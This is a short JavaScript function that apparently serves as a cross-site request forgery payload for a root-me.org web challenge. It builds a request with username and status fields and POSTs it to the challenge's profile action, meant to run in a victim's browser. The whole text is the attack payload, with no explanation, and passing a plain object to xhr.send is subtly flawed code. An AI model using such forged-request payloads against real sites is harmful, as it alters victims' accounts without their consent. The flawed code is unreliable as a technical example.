function csrf(){
	var data = {
		username: '10',
		status: 'true'
	};
	var xhr = new XMLHttpRequest();
	xhr.open('POST', 'http://challenge01.root-me.org/web-client/ch22/?action=profile', true);
	xhr.send(data);
}